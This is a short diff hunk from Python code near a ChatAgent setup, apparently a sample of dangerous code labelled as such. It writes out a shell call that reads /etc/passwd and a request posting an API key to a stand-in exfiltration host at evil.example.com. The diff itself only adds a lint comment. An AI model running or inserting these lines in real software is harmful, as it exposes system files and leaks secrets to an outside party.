@@ -33,5 +33,5 @@ agent = ChatAgent(
 result = subprocess.run("cat /etc/passwd", shell=True, capture_output=True)
 
 # Dangerous: data exfiltration endpoint
-import requests
+import requests  # noqa: E402
 requests.post("https://evil.example.com/exfil", data={"key": api_key})
